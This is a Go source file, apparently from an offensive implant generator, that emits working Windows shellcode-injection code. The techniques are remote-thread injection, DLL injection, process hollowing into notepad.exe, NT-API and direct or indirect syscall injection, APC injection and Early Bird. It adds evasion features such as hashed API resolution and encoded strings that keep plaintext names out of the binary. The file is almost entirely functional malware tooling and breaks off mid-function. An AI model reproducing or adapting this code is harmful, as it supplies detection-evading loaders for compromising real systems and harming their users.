// remote.go — emitted helpers + run() bodies for the remote-injection
// techniques (pe02, pe05, pe08, pe23, pe24, pe25). They target a remote process
// named by --process (default explorer.exe).
//
// Like the local family, every offensive Win32/NT API is resolved by DJB2 hash
// at runtime so no plaintext API name reaches the binary. The process name is
// numeric-encoded. Runtime correctness is validated on a Windows target; the
// generator only compiles the project (it never runs the implant).
package payload

import (
	"fmt"
	"strings"

	"shroud/internal/evasion"
)

// pidByNameHelper emits the process-name -> PID resolver (toolhelp snapshot)
// plus the PROCESSENTRY32W struct and a case-insensitive UTF-16 compare. Used
// by all remote techniques.
func (b *Builder) pidByNameHelper() string {
	_, hCTH32S := b.api("kernel32.dll", "CreateToolhelp32Snapshot")
	_, hP32F := b.api("kernel32.dll", "Process32FirstW")
	_, hP32N := b.api("kernel32.dll", "Process32NextW")
	_, hCH := b.api("kernel32.dll", "CloseHandle")
	return fmt.Sprintf(`// PROCESSENTRY32W (toolhelp snapshot).
type procEntry struct {
	Size     uint32
	ProcessID uint32
	Threads  uint32
	ParentID uint32
	PriClass int32
	_        [4]byte // dwFlags
	ExeFile  [260]uint16 // szExeFile (WCHAR[MAX_PATH])
}

// pidByName resolves a PID from a process name (case-insensitive) via the
// toolhelp snapshot. The name is supplied as numeric bytes (no plaintext).
func pidByName(name string) uint32 {
	snap, _, _ := wincall.CallG0(%s, uintptr(0x2), uintptr(0)) // TH32CS_SNAPPROCESS
	if snap == 0 || snap == 0xffffffff {
		return 0
	}
	var e procEntry
	e.Size = uint32(unsafe.Sizeof(e))
	ok, _, _ := wincall.CallG0(%s, snap, uintptr(unsafe.Pointer(&e)))
	for ok != 0 {
		if procNameMatches(e.ExeFile[:], name) {
			wincall.CallG0(%s, snap)
			return e.ProcessID
		}
		ok, _, _ = wincall.CallG0(%s, snap, uintptr(unsafe.Pointer(&e)))
	}
	wincall.CallG0(%s, snap)
	return 0
}

// procNameMatches compares a UTF-16 process name (NUL-terminated) to an ASCII
// target, case-insensitively.
func procNameMatches(utf16 []uint16, ascii string) bool {
	for i := 0; i < len(ascii); i++ {
		if i >= len(utf16) || utf16[i] == 0 {
			return false
		}
		a := byte(ascii[i])
		if a >= 'A' && a <= 'Z' {
			a += 0x20
		}
		c := byte(utf16[i])
		if c >= 'A' && c <= 'Z' {
			c += 0x20
		}
		if a != c {
			return false
		}
	}
	// ensure the utf16 name ends right after the ascii match
	if len(ascii) < len(utf16) && utf16[len(ascii)] != 0 {
		return false
	}
	return true
}

`, hCTH32S, hP32F, hCH, hP32N, hCH)
}

// procNameLit emits the numeric byte-array for the configured --process name.
func (b *Builder) procNameLit() string {
	name := b.Spec.Process
	if name == "" {
		name = "explorer.exe"
	}
	args := make([]string, 0, len(name))
	for _, c := range name {
		args = append(args, fmt.Sprintf("0x%02x", byte(c)))
	}
	return "memName(" + strings.Join(args, ", ") + ")"
}

// remoteRunBody emits the run() body dispatching to the technique-specific
// remote primitive.
func (b *Builder) remoteRunBody() string {
	// pe12 Early Bird spawns its own suspended process — it does not inject into a
	// running target, so the pidByName preamble (and its target-found guard) does
	// not apply. Emit a self-contained run() + body.
	if b.Spec.Tech.ID == "pe12" {
		return b.pe12RunBody()
	}
	// pe14 Process Ghosting also spawns its own (fileless) process from a ghosted
	// image section — no pidByName preamble. Self-contained run() + body.
	if b.Spec.Tech.ID == "pe14" {
		return b.pe14RunBody()
	}
	var sb strings.Builder
	sb.WriteString("func run() {\n")
	if init := b.evasionInit(); init != "" {
		sb.WriteString(init + "\n")
	}
	sb.WriteString("\tpayload := " + b.decryptOrRaw() + "\n")
	sb.WriteString("\ttarget := pidByName(" + b.procNameLit() + ")\n")
	sb.WriteString("\tif target == 0 {\n\t\treturn\n\t}\n")

	switch b.Spec.Tech.ID {
	case "pe02", "pe03":
		// pe03 is pe02 + dynamic-api; in the Go rewrite every technique already
		// resolves by hash, so pe03 reuses the pe02 body verbatim.
		sb.WriteString("\tpe02Inject(target, payload)\n")
		sb.WriteString("}\n\n")
		sb.WriteString(b.pe02Body())
	case "pe05":
		// pe05 injects a DLL path (LoadLibrary), not shellcode — payload unused.
		sb.WriteString("\t_ = payload\n")
		sb.WriteString("\tpe05LoadLibrary(target)\n")
		sb.WriteString("}\n\n")
		sb.WriteString(b.pe05Body())
	case "pe08":
		sb.WriteString("\tpe08Hollow(payload)\n")
		sb.WriteString("}\n\n")
		sb.WriteString(b.pe08Body())
	case "pe23":
		sb.WriteString("\tpe23NTInject(target, payload)\n")
		sb.WriteString("}\n\n")
		sb.WriteString(b.ntStructs())
		sb.WriteString(b.pe23Body())
	case "pe24":
		sb.WriteString("\tpe24DirectSyscall(target, payload)\n")
		sb.WriteString("}\n\n")
		sb.WriteString(b.ntStructs())
		sb.WriteString(b.pe24Body())
	case "pe25":
		sb.WriteString("\tpe25IndirectSyscall(target, payload)\n")
		sb.WriteString("}\n\n")
		sb.WriteString(b.ntStructs())
		sb.WriteString(b.pe25Body())
	case "pe11":
		// pe11 APC: queue shellcode as an APC onto a target thread. Effectiveness
		// depends on the thread entering an alertable wait (see pe12 for the
		// lifecycle-start variant that avoids this).
		sb.WriteString("\tpe11APCInject(target, payload)\n")
		sb.WriteString("}\n\n")
		sb.WriteString(b.pe11Body())
	case "pe15":
		// pe15 thread hijack: suspend a target thread, rewrite Rip to the
		// shellcode, resume — no CreateRemoteThread.
		sb.WriteString("\tpe15Hijack(target, payload)\n")
		sb.WriteString("}\n\n")
		sb.WriteString(b.pe15Body())
	case "pe13":
		// pe13 RWX hunt: scan the target VA space for an already-RWX region and
		// write shellcode into it — no fresh RWX allocation.
		sb.WriteString("\tpe13RWXHunt(target, payload)\n")
		sb.WriteString("}\n\n")
		sb.WriteString(b.pe13Body())
	case "pe10":
		// pe10 AddressOfEntryPoint: WPM shellcode into the target's already-RX
		// entry region — no VirtualAllocEx, no VirtualProtectEx.
		sb.WriteString("\tpe10EntryInject(target, payload)\n")
		sb.WriteString("}\n\n")
		sb.WriteString(b.pe10Body())
	case "pe16":
		// pe16 module stomping: force-load a legit DLL, overwrite its .text with
		// shellcode, execute from the backed module.
		sb.WriteString("\tpe16Stomp(target, payload)\n")
		sb.WriteString("}\n\n")
		sb.WriteString(b.pe16Body())
	case "pe19":
		// pe19 section mapping: shared section mapped into both processes, no
		// cross-process WriteProcessMemory.
		sb.WriteString("\tpe19Section(target, payload)\n")
		sb.WriteString("}\n\n")
		sb.WriteString(b.ntStructs())
		sb.WriteString(b.pe19Body())
	case "pe06":
		// pe06 reflective DLL: manual-map a DLL into the target, call DllMain.
		sb.WriteString("\tpe06Reflective(target, payload)\n")
		sb.WriteString("}\n\n")
		sb.WriteString(b.pe06Body())
	case "pe09":
		// pe09 whole-PE: manual-map an EXE into the target, call its entrypoint.
		sb.WriteString("\tpe09WholePE(target, payload)\n")
		sb.WriteString("}\n\n")
		sb.WriteString(b.pe09Body())
	case "pe17", "pe18":
		// pe17/pe18 are PEB-walk aliases: every Go technique already resolves
		// APIs via a PEB walk + DJB2 hash, so they reuse the pe02 body verbatim.
		// Generate pe17/pe18 with -e dynamic-api for the layered obfuscation.
		sb.WriteString("\tpe02Inject(target, payload)\n")
		sb.WriteString("}\n\n")
		sb.WriteString(b.pe02Body())
	default:
		sb.WriteString("\t_ = payload\n")
		sb.WriteString("}\n\n")
	}
	return sb.String()
}

// ntStructs emits the CLIENT_ID and OBJECT_ATTRIBUTES structs shared by the
// NT-API techniques (pe23/pe24/pe25). Emitted once per build, before whichever
// technique body references them.
func (b *Builder) ntStructs() string {
	return `// CLIENT_ID {UniqueProcess, UniqueThread}; OBJECT_ATTRIBUTES for NtOpenProcess.
type clientId struct{ P, T uintptr }
type objAttrs struct {
	Length        uint32
	RootDirectory uintptr
	ObjectName    uintptr
	Attributes    uint32
	SecurityDesc  uintptr
	SecurityQoS   uintptr
}

`
}

// pe02Body: OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread.
func (b *Builder) pe02Body() string {
	_, hOP := b.api("kernel32.dll", "OpenProcess")
	_, hVA := b.api("kernel32.dll", "VirtualAllocEx")
	_, hWPM := b.api("kernel32.dll", "WriteProcessMemory")
	_, hCRT := b.api("kernel32.dll", "CreateRemoteThread")
	_, hWFSO := b.api("kernel32.dll", "WaitForSingleObject")
	_, hCH := b.api("kernel32.dll", "CloseHandle")
	return fmt.Sprintf(`func pe02Inject(pid uint32, payload []byte) {
	// PROCESS_ALL_ACCESS = 0x1f0fff
	h, _, _ := wincall.CallG0(%s, uintptr(0x1f0fff), uintptr(0), uintptr(pid))
	if h == 0 {
		return
	}
	addr, _, _ := wincall.CallG0(%s, h, uintptr(0), uintptr(len(payload)),
		uintptr(0x3000), uintptr(0x40)) // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
	if addr == 0 {
		wincall.CallG0(%s, h)
		return
	}
	var written uintptr
	wincall.CallG0(%s, h, addr, uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)), uintptr(unsafe.Pointer(&written)))
	tid := uint32(0)
	t, _, _ := wincall.CallG0(%s, h, uintptr(0), uintptr(0), addr, uintptr(0),
		uintptr(0), uintptr(unsafe.Pointer(&tid)))
	if t != 0 {
		wincall.CallG0(%s, t, uintptr(0xffffffff))
		wincall.CallG0(%s, t)
	}
	wincall.CallG0(%s, h)
}

`, hOP, hVA, hCH, hWPM, hCRT, hWFSO, hCH, hCH)
}

// pe05Body: OpenProcess + VirtualAllocEx + write DLL path + CreateRemoteThread(LoadLibraryA, path).
func (b *Builder) pe05Body() string {
	_, hOP := b.api("kernel32.dll", "OpenProcess")
	_, hVA := b.api("kernel32.dll", "VirtualAllocEx")
	_, hWPM := b.api("kernel32.dll", "WriteProcessMemory")
	_, hCRT := b.api("kernel32.dll", "CreateRemoteThread")
	b.api("kernel32.dll", "LoadLibraryA") // registers hLoadLibraryA + hKernel32Dll
	_, hCH := b.api("kernel32.dll", "CloseHandle")
	dllPath := b.Spec.DLL
	if dllPath == "" {
		dllPath = `C:\tools\panda.dll`
	}
	// numeric-encode the DLL path (no plaintext string literal).
	args := make([]string, 0, len(dllPath))
	for _, c := range dllPath {
		args = append(args, fmt.Sprintf("0x%02x", byte(c)))
	}
	return fmt.Sprintf(`func pe05LoadLibrary(pid uint32) {
	h, _, _ := wincall.CallG0(%s, uintptr(0x1f0fff), uintptr(0), uintptr(pid))
	if h == 0 {
		return
	}
	pathBytes := []byte(%s) // the DLL path (numeric-encoded), NUL-terminated below
	pathBytes = append(pathBytes, 0)
	addr, _, _ := wincall.CallG0(%s, h, uintptr(0), uintptr(len(pathBytes)),
		uintptr(0x3000), uintptr(0x04)) // PAGE_READWRITE
	if addr == 0 {
		wincall.CallG0(%s, h)
		return
	}
	var written uintptr
	wincall.CallG0(%s, h, addr, uintptr(unsafe.Pointer(&pathBytes[0])),
		uintptr(len(pathBytes)), uintptr(unsafe.Pointer(&written)))
	// LoadLibraryA address, resolved by hash in THIS process (same export in the
	// target once kernel32 is loaded).
	loadLib := api(hKernel32Dll, hLoadLibraryA)
	tid := uint32(0)
	t, _, _ := wincall.CallG0(%s, h, uintptr(0), uintptr(0), loadLib, addr,
		uintptr(0), uintptr(unsafe.Pointer(&tid)))
	if t != 0 {
		wincall.CallG0(%s, t)
	}
	wincall.CallG0(%s, h)
}

`, hOP, "[]byte{"+strings.Join(args, ", ")+"}", hVA, hCH, hWPM, hCRT, hCH, hCH)
}

// pe08Body: process hollowing (shellcode variant). CreateProcess(suspended),
// read PEB.ImageBaseAddress, NtUnmapViewOfSection the old image, allocate +
// write shellcode at the hollowed base, set thread context Rip to the
// shellcode, ResumeThread — runs the payload under a trusted process identity.
func (b *Builder) pe08Body() string {
	_, hCPW := b.api("kernel32.dll", "CreateProcessW")
	_, hGTC := b.api("kernel32.dll", "GetThreadContext")
	_, hSTC := b.api("kernel32.dll", "SetThreadContext")
	_, hRT := b.api("kernel32.dll", "ResumeThread")
	_, hCH := b.api("kernel32.dll", "CloseHandle")
	_, hVA := b.api("kernel32.dll", "VirtualAllocEx")
	_, hWPM := b.api("kernel32.dll", "WriteProcessMemory")
	_, hRPM := b.api("kernel32.dll", "ReadProcessMemory")
	_, hNtUV := b.api("ntdll.dll", "NtUnmapViewOfSection")
	_, hNtQI := b.api("ntdll.dll", "NtQueryInformationProcess")
	return fmt.Sprintf(`// STARTUPINFOW is 104 bytes; PROCESS_INFORMATION is 16 bytes. We keep them
// as raw fixed-size buffers to avoid a full struct mirror — only cb matters.
type startupInfoW [104]byte
type processInfoW struct {
	ProcessHandle uintptr
	ThreadHandle  uintptr
	ProcessID     uint32
	ThreadID      uint32
}
// contextAmd64 — the x64 CONTEXT. We only touch Rip/Rcx; the layout below is a
// minimal correct prefix (P1Home.., ContextFlags, MxCsr, SegCs/SegSs/EFlags,
// SegDs/Es/Fs/Gs, RegRax..R15) followed by Rip at offset 0xF8. To stay correct
// without mirroring the whole union, we allocate the full 1232-byte CONTEXT
// and patch Rip via a known offset.
const ctxAmd64Size = 1232
const ctxAmd64Flags = 0x100010 // CONTEXT_AMD64 (0x100000) | CONTEXT_CONTROL (0x10)
const ctxRipOffset = 0xF8

func pe08Hollow(payload []byte) {
	var si startupInfoW
	*(*uint32)(unsafe.Pointer(&si[0])) = uint32(len(si)) // cb
	var pi processInfoW
	// notepad.exe, numeric-encoded (no plaintext string literal).
	exe := memName(0x6e, 0x6f, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2e, 0x65, 0x78, 0x65)
	exeUTF16 := stringToUTF16(exe)
	// CreateProcessW(NULL, exe, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)
	ok, _, _ := wincall.CallG0(%s, uintptr(0), uintptr(unsafe.Pointer(exeUTF16)),
		uintptr(0), uintptr(0), uintptr(0), uintptr(0x4), uintptr(0), uintptr(0),
		uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
	if ok == 0 {
		return
	}
	// Read PEB.ImageBaseAddress: NtQueryInformationProcess(ProcessBasicInformation)
	// returns PROCESS_BASIC_INFORMATION { ReservedPeb, PebBaseAddress, ... }.
	var pbi [48]byte
	var retLen uint32
	wincall.CallG0(%s, pi.ProcessHandle, uintptr(0),
		uintptr(unsafe.Pointer(&pbi[0])), uintptr(len(pbi)),
		uintptr(unsafe.Pointer(&retLen)))
	pebAddr := *(*uintptr)(unsafe.Pointer(&pbi[8])) // PebBaseAddress
	// ReadProcessMemory(h, PEB+0x10, &imageBase, 8, &bytes)
	var imageBase uintptr
	var bytes uint32
	wincall.CallG0(%s, pi.ProcessHandle, pebAddr+uintptr(0x10),
		uintptr(unsafe.Pointer(&imageBase)), uintptr(8),
		uintptr(unsafe.Pointer(&bytes)))
	if imageBase != 0 {
		// NtUnmapViewOfSection(ProcessHandle, BaseAddress) — free the old image.
		wincall.CallG0(%s, pi.ProcessHandle, imageBase)
	}
	// Allocate at the old image base (preferred) for the shellcode.
	remote, _, _ := wincall.CallG0(%s, pi.ProcessHandle, imageBase,
		uintptr(len(payload)), uintptr(0x3000), uintptr(0x40))
	if remote == 0 {
		remote, _, _ = wincall.CallG0(%s, pi.ProcessHandle, uintptr(0),
			uintptr(len(payload)), uintptr(0x3000), uintptr(0x40))
	}
	if remote == 0 {
		wincall.CallG0(%s, pi.ProcessHandle)
		wincall.CallG0(%s, pi.ThreadHandle)
		return
	}
	var written uintptr
	wincall.CallG0(%s, pi.ProcessHandle, remote,
		uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)),
		uintptr(unsafe.Pointer(&written)))
	// Patch the thread context: Rip = shellcode entry.
	ctx := make([]byte, ctxAmd64Size)
	*(*uint32)(unsafe.Pointer(&ctx[0x30])) = ctxAmd64Flags // ContextFlags at offset 0x30
	wincall.CallG0(%s, pi.ThreadHandle, uintptr(unsafe.Pointer(&ctx[0])))
	*(*uintptr)(unsafe.Pointer(&ctx[ctxRipOffset])) = remote
	wincall.CallG0(%s, pi.ThreadHandle, uintptr(unsafe.Pointer(&ctx[0])))
	// ResumeThread -> shellcode runs under notepad's identity.
	wincall.CallG0(%s, pi.ThreadHandle)
	wincall.CallG0(%s, pi.ThreadHandle)
	wincall.CallG0(%s, pi.ProcessHandle)
}

// stringToUTF16 returns a pointer to a NUL-terminated UTF-16 copy of s.
func stringToUTF16(s string) *uint16 {
	buf := make([]uint16, 0, len(s)+1)
	for _, r := range s {
		if r < 0x10000 {
			buf = append(buf, uint16(r))
		} else {
			r -= 0x10000
			buf = append(buf, 0xd800|uint16(r>>10), 0xdc00|uint16(r&0x3ff))
		}
	}
	buf = append(buf, 0)
	return &buf[0]
}

`, hCPW, hNtQI, hRPM, hNtUV, hVA, hVA, hCH, hCH, hWPM, hGTC, hSTC, hRT, hCH, hCH)
}

// pe23Body: NT-API remote inject via resolved ntdll function pointers.
func (b *Builder) pe23Body() string {
	_, hNtOP := b.api("ntdll.dll", "NtOpenProcess")
	_, hNtAVM := b.api("ntdll.dll", "NtAllocateVirtualMemory")
	_, hNtWVM := b.api("ntdll.dll", "NtWriteVirtualMemory")
	_, hNtPVM := b.api("ntdll.dll", "NtProtectVirtualMemory")
	_, hNtCTE := b.api("ntdll.dll", "NtCreateThreadEx")
	_, hNtWFSO := b.api("ntdll.dll", "NtWaitForSingleObject")
	_, hNtClose := b.api("ntdll.dll", "NtClose")
	return fmt.Sprintf(`func pe23NTInject(pid uint32, payload []byte) {
	var oa objAttrs
	oa.Length = uint32(unsafe.Sizeof(oa))
	var cid clientId
	cid.P = uintptr(pid)
	var h uintptr
	// NtOpenProcess(&h, PROCESS_ALL_ACCESS, &oa, &cid)
	wincall.CallG0(%s, uintptr(unsafe.Pointer(&h)), uintptr(0x1f0fff),
		uintptr(unsafe.Pointer(&oa)), uintptr(unsafe.Pointer(&cid)))
	if h == 0 {
		return
	}
	addr := uintptr(0)
	size := uintptr(len(payload))
	// NtAllocateVirtualMemory(h, &addr, 0, &size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	wincall.CallG0(%s, h, uintptr(unsafe.Pointer(&addr)), uintptr(0),
		uintptr(unsafe.Pointer(&size)), uintptr(0x3000), uintptr(0x04))
	var written uintptr
	// NtWriteVirtualMemory(h, addr, payload, len, &written)
	wincall.CallG0(%s, h, addr, uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)), uintptr(unsafe.Pointer(&written)))
	base := addr
	regionSize := size
	var oldProtect uintptr
	// NtProtectVirtualMemory(h, &base, &regionSize, PAGE_EXECUTE_READ, &oldProtect)
	wincall.CallG0(%s, h, uintptr(unsafe.Pointer(&base)),
		uintptr(unsafe.Pointer(&regionSize)), uintptr(0x20),
		uintptr(unsafe.Pointer(&oldProtect)))
	var thread uintptr
	// NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, NULL, h, addr, NULL, FALSE, 0, 0, 0, NULL)
	wincall.CallG0(%s, uintptr(unsafe.Pointer(&thread)), uintptr(0x1fffff),
		uintptr(0), h, addr, uintptr(0), uintptr(0), uintptr(0), uintptr(0), uintptr(0), uintptr(0))
	if thread != 0 {
		wincall.CallG0(%s, thread, uintptr(0), uintptr(0))
		wincall.CallG0(%s, thread)
	}
	wincall.CallG0(%s, h)
}

`, hNtOP, hNtAVM, hNtWVM, hNtPVM, hNtCTE, hNtWFSO, hNtClose, hNtClose)
}

// pe24Body: direct syscalls (wincall.Syscall + GetSyscall SSN).
func (b *Builder) pe24Body() string {
	// Register hashes for GetSyscall lookups (same names).
	b.api("ntdll.dll", "NtOpenProcess")
	b.api("ntdll.dll", "NtAllocateVirtualMemory")
	b.api("ntdll.dll", "NtWriteVirtualMemory")
	b.api("ntdll.dll", "NtProtectVirtualMemory")
	b.api("ntdll.dll", "NtCreateThreadEx")
	b.api("ntdll.dll", "NtWaitForSingleObject")
	b.api("ntdll.dll", "NtClose")
	return fmt.Sprintf(`func pe24DirectSyscall(pid uint32, payload []byte) {
	scOpen := wincall.GetSyscall(hNtOpenProcess)
	scAlloc := wincall.GetSyscall(hNtAllocateVirtualMemory)
	scWrite := wincall.GetSyscall(hNtWriteVirtualMemory)
	scProt := wincall.GetSyscall(hNtProtectVirtualMemory)
	scThread := wincall.GetSyscall(hNtCreateThreadEx)
	var oa objAttrs
	oa.Length = uint32(unsafe.Sizeof(oa))
	var cid clientId
	cid.P = uintptr(pid)
	var h uintptr
	wincall.Syscall(scOpen.SSN,
		uintptr(unsafe.Pointer(&h)), uintptr(0x1f0fff),
		uintptr(unsafe.Pointer(&oa)), uintptr(unsafe.Pointer(&cid)))
	if h == 0 {
		return
	}
	addr := uintptr(0)
	size := uintptr(len(payload))
	wincall.Syscall(scAlloc.SSN, h, uintptr(unsafe.Pointer(&addr)), uintptr(0),
		uintptr(unsafe.Pointer(&size)), uintptr(0x3000), uintptr(0x04))
	var written uintptr
	wincall.Syscall(scWrite.SSN, h, addr, uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)), uintptr(unsafe.Pointer(&written)))
	base := addr
	rs := size
	var old uintptr
	wincall.Syscall(scProt.SSN, h, uintptr(unsafe.Pointer(&base)),
		uintptr(unsafe.Pointer(&rs)), uintptr(0x20), uintptr(unsafe.Pointer(&old)))
	var thread uintptr
	wincall.Syscall(scThread.SSN, uintptr(unsafe.Pointer(&thread)), uintptr(0x1fffff),
		uintptr(0), h, addr, uintptr(0), uintptr(0), uintptr(0), uintptr(0), uintptr(0), uintptr(0))
	if thread != 0 {
		wincall.Syscall(wincall.GetSyscall(hNtWaitForSingleObject).SSN, thread, uintptr(0), uintptr(0))
		wincall.Syscall(wincall.GetSyscall(hNtClose).SSN, thread)
	}
	wincall.Syscall(wincall.GetSyscall(hNtClose).SSN, h)
}

`)
}

// pe25Body: indirect syscalls (wincall.IndirectSyscall — jump to the syscall
// gadget inside ntdll, so the return address originates in ntdll).
func (b *Builder) pe25Body() string {
	b.api("ntdll.dll", "NtOpenProcess")
	b.api("ntdll.dll", "NtAllocateVirtualMemory")
	b.api("ntdll.dll", "NtWriteVirtualMemory")
	b.api("ntdll.dll", "NtProtectVirtualMemory")
	b.api("ntdll.dll", "NtCreateThreadEx")
	b.api("ntdll.dll", "NtWaitForSingleObject")
	b.api("ntdll.dll", "NtClose")
	return fmt.Sprintf(`func pe25IndirectSyscall(pid uint32, payload []byte) {
	scOpen := wincall.GetSyscall(hNtOpenProcess)
	scAlloc := wincall.GetSyscall(hNtAllocateVirtualMemory)
	scWrite := wincall.GetSyscall(hNtWriteVirtualMemory)
	scProt := wincall.GetSyscall(hNtProtectVirtualMemory)
	scThread := wincall.GetSyscall(hNtCreateThreadEx)
	scWait := wincall.GetSyscall(hNtWaitForSingleObject)
	scClose := wincall.GetSyscall(hNtClose)
	var oa objAttrs
	oa.Length = uint32(unsafe.Sizeof(oa))
	var cid clientId
	cid.P = uintptr(pid)
	var h uintptr
	wincall.IndirectSyscall(scOpen.SSN, scOpen.Address,
		uintptr(unsafe.Pointer(&h)), uintptr(0x1f0fff),
		uintptr(unsafe.Pointer(&oa)), uintptr(unsafe.Pointer(&cid)))
	if h == 0 {
		return
	}
	addr := uintptr(0)
	size := uintptr(len(payload))
	wincall.IndirectSyscall(scAlloc.SSN, scAlloc.Address, h, uintptr(unsafe.Pointer(&addr)),
		uintptr(0), uintptr(unsafe.Pointer(&size)), uintptr(0x3000), uintptr(0x04))
	var written uintptr
	wincall.IndirectSyscall(scWrite.SSN, scWrite.Address, h, addr,
		uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)),
		uintptr(unsafe.Pointer(&written)))
	base := addr
	rs := size
	var old uintptr
	wincall.IndirectSyscall(scProt.SSN, scProt.Address, h, uintptr(unsafe.Pointer(&base)),
		uintptr(unsafe.Pointer(&rs)), uintptr(0x20), uintptr(unsafe.Pointer(&old)))
	var thread uintptr
	wincall.IndirectSyscall(scThread.SSN, scThread.Address, uintptr(unsafe.Pointer(&thread)),
		uintptr(0x1fffff), uintptr(0), h, addr, uintptr(0), uintptr(0), uintptr(0), uintptr(0), uintptr(0), uintptr(0))
	if thread != 0 {
		wincall.IndirectSyscall(scWait.SSN, scWait.Address, thread, uintptr(0), uintptr(0))
		wincall.IndirectSyscall(scClose.SSN, scClose.Address, thread)
	}
	wincall.IndirectSyscall(scClose.SSN, scClose.Address, h)
}

`)
}

// threadEnumHelper emits the THREADENTRY32 struct + threadIDByPID resolver (toolhelp
// TH32CS_SNAPTHREAD snapshot, first thread owned by pid). Used by pe11 (APC) and
// pe15 (thread hijack) to obtain a target thread handle. Emitted once per build
// (only one of pe11/pe15 is active at a time).
func (b *Builder) threadEnumHelper() string {
	_, hCTH32S := b.api("kernel32.dll", "CreateToolhelp32Snapshot")
	_, hT32F := b.api("kernel32.dll", "Thread32First")
	_, hT32N := b.api("kernel32.dll", "Thread32Next")
	_, hCH := b.api("kernel32.dll", "CloseHandle")
	return fmt.Sprintf(`// THREADENTRY32 (toolhelp thread snapshot). 7 DWORDs = 28 bytes.
type threadEntry32 struct {
	Size     uint32
	Usage    uint32
	ThreadID uint32
	OwnerPID uint32
	BasePri  int32
	DeltaPri int32
	Flags    uint32
}

// threadIDByPID returns the first thread ID owned by pid via the toolhelp thread
// snapshot (TH32CS_SNAPTHREAD). Used to obtain a handle to a target thread for
// APC queuing (pe11) and context hijack (pe15).
func threadIDByPID(pid uint32) uint32 {
	snap, _, _ := wincall.CallG0(%s, uintptr(0x4), uintptr(0)) // TH32CS_SNAPTHREAD
	if snap == 0 || snap == 0xffffffff {
		return 0
	}
	var te threadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	ok, _, _ := wincall.CallG0(%s, snap, uintptr(unsafe.Pointer(&te)))
	for ok != 0 {
		if te.OwnerPID == pid {
			wincall.CallG0(%s, snap)
			return te.ThreadID
		}
		ok, _, _ = wincall.CallG0(%s, snap, uintptr(unsafe.Pointer(&te)))
	}
	wincall.CallG0(%s, snap)
	return 0
}

`, hCTH32S, hT32F, hCH, hT32N, hCH)
}

// pe11Body: APC injection. Open the target, stage shellcode RW->RX in it, open a
// thread owned by the target, and queue the shellcode as an APC on that thread. The
// APC fires when the thread enters an alertable wait (SleepEx/WaitForSingleObjectEx
// with bAlertable=TRUE) — pe12 (Early Bird) is the lifecycle-start variant that
// sidesteps this dependency.
func (b *Builder) pe11Body() string {
	_, hOP := b.api("kernel32.dll", "OpenProcess")
	_, hVA := b.api("kernel32.dll", "VirtualAllocEx")
	_, hWPM := b.api("kernel32.dll", "WriteProcessMemory")
	_, hVPX := b.api("kernel32.dll", "VirtualProtectEx")
	_, hOT := b.api("kernel32.dll", "OpenThread")
	_, hQUAPC := b.api("kernel32.dll", "QueueUserAPC")
	_, hCH := b.api("kernel32.dll", "CloseHandle")
	return fmt.Sprintf(`func pe11APCInject(pid uint32, payload []byte) {
	// OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)
	h, _, _ := wincall.CallG0(%s, uintptr(0x1f0fff), uintptr(0), uintptr(pid))
	if h == 0 {
		return
	}
	// VirtualAllocEx(h, NULL, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	addr, _, _ := wincall.CallG0(%s, h, uintptr(0), uintptr(len(payload)),
		uintptr(0x3000), uintptr(0x04))
	if addr == 0 {
		wincall.CallG0(%s, h)
		return
	}
	var written uintptr
	wincall.CallG0(%s, h, addr, uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)), uintptr(unsafe.Pointer(&written)))
	// VirtualProtectEx(h, addr, len, PAGE_EXECUTE_READ, &old)
	var old uintptr
	wincall.CallG0(%s, h, addr, uintptr(len(payload)), uintptr(0x20),
		uintptr(unsafe.Pointer(&old)))
	// OpenThread(THREAD_ALL_ACCESS, FALSE, tid) — a thread owned by the target.
	tid := threadIDByPID(pid)
	if tid == 0 {
		wincall.CallG0(%s, h)
		return
	}
	th, _, _ := wincall.CallG0(%s, uintptr(0x1fffff), uintptr(0), uintptr(tid))
	if th == 0 {
		wincall.CallG0(%s, h)
		return
	}
	// QueueUserAPC(shellcode, thread, 0) — fires on the next alertable wait.
	wincall.CallG0(%s, addr, th, uintptr(0))
	wincall.CallG0(%s, th)
	wincall.CallG0(%s, h)
}

`, hOP, hVA, hCH, hWPM, hVPX, hCH, hOT, hCH, hQUAPC, hCH, hCH)
}

// pe12RunBody emits the self-contained run() + pe12EarlyBird body for the Early Bird
// technique. pe12 spawns its own suspended process (it does not inject into a running
// target), so it bypasses the pidByName preamble used by the other remote techniques.
// (pidByName is still emitted by remoteRun, but is simply unused — package-level
// unused functions are legal in Go.)
func (b *Builder) pe12RunBody() string {
	var sb strings.Builder
	sb.WriteString("func run() {\n")
	if init := b.evasionInit(); init != "" {
		sb.WriteString(init + "\n")
	}
	sb.WriteString("\tpayload := " + b.decryptOrRaw() + "\n")
	sb.WriteString("\tpe12EarlyBird(payload)\n")
	sb.WriteString("}\n\n")
	sb.WriteString(b.pe12Body())
	return sb.String()
}

// pe12Body: Early Bird APC injection. CreateProcess(suspended), stage shellcode
// RW->RX in the fresh process, QueueUserAPC(shellcode, main thread, 0), ResumeThread
// — the APC is queued before the image entry runs, so the shellcode executes first
// under the new (sacrificial) process identity. Avoids pe11's alertable-wait
// dependency. Self-contained structs (pe12-local names — one technique per build, no
// collision with pe08's helpers).
func (b *Builder) pe12Body() string {
	_, hCPW := b.api("kernel32.dll", "CreateProcessW")
	_, hVA := b.api("kernel32.dll", "VirtualAllocEx")
	_, hWPM := b.api("kernel32.dll", "WriteProcessMemory")
	_, hVPX := b.api("kernel32.dll", "VirtualProtectEx")
	_, hQUAPC := b.api("kernel32.dll", "QueueUserAPC")
	_, hRT := b.api("kernel32.dll", "ResumeThread")
	_, hCH := b.api("kernel32.dll", "CloseHandle")
